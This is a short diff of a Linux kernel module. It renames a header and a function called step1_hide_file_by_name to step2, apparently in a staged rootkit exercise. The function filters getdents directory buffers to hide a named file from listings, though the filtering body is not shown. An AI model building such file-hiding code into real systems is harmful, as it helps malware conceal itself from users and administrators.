@@ -1,4 +1,4 @@
-#include "step1.h"
+#include "step2.h"
 
 #include <linux/module.h>
 #include <linux/dirent.h>
@@ -13,7 +13,7 @@ static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int en
 /// @param getdents_buffer_size
 /// @param filename_to_hide
 /// @return new buffer size
-unsigned long step1_hide_file_by_name(void* getdents_buffer, size_t getdents_buffer_size, char* filename_to_hide){
+unsigned long step2_hide_file_by_name(void* getdents_buffer, size_t getdents_buffer_size, char* filename_to_hide){
     unsigned long offset = 0;
 
     // find entry to hide
